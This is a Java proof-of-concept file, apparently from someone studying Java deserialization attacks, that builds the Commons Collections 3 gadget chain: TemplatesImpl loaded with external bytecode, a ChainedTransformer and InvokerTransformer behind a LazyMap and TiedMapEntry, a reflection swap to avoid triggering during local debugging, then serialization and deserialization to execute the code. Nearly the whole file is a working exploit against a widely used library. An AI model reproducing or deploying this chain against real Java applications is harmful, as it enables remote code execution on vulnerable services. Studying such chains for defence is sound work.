package CommonsCollection.Clown_CC3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.transforms.Transform;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class POC1 {
    public static void Serliazation(Object object) throws Exception{
        FileOutputStream fileInputStream = new FileOutputStream("poc1.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileInputStream);
        objectOutputStream.writeObject(object);
        System.out.println("Output");
    }

    public static void Unserlization() throws Exception{
        FileInputStream fileInputStream =new FileInputStream("poc1.txt");
        ObjectInputStream objectInputStream =new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("Input");
    }

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaaa");

        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("E:\\study_java\\test\\Test.class"));
        byte[][] codes = {code};
        bytecodes.set(templates,codes);

//        Field tfactory = aClass.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap map = new HashMap();
        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
//        Map lazymap = LazyMap.decorate(map,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");

        HashMap<Object, Object> map2 = new HashMap<>();//这里是触发点
        map2.put(tiedMapEntry,"bbb");
        lazymap.remove("aaa");//这里将序列化过程中存入的key删除

        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
        Field factoryField = clazz.getDeclaredField("factory");
        factoryField.setAccessible(true);//私有属性
        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数

        Serliazation(map2);
        Unserlization();
    }
}
